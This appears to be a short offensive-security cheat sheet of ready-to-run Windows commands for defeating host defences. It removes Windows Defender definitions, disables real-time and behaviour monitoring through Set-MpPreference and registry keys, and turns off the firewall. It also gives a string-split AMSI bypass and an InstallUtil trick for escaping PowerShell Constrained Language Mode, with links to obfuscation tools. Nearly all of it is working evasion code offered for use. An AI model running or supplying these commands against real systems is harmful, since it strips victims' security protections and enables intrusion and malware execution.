### Disable Defender
Powershell:
```
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
NetSh Advfirewall set allprofiles state off
```

CMD:
```
"C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
netsh advfirewall set allprofiles state off
```


### Simple AMSI bypass
```
$a = [Ref].Assembly.GetType('System.Management.Automation' + '.A' + 'm' + 's' + 'iU' + 'til' + 's')
$b = 'am'+'s'+'iI'+'n'+'it'+'Fai'+'l'+'ed'
$c = $a.GetField($b,'NonPublic,Static')
$c.SetValue($null,$true)
```

### CLM
```
# Check CLM:
$ExecutionContext.SessionState.LanguageMode

# Using CLMBypass.cs
# Runs a single command
ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\clm.exe"

# Using https://github.com/calebstewart/bypass-clm
# Use https://github.com/h4wkst3r/InvisibilityCloak to obfuscate it
# Changes CLM on current session
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\clm.exe
```
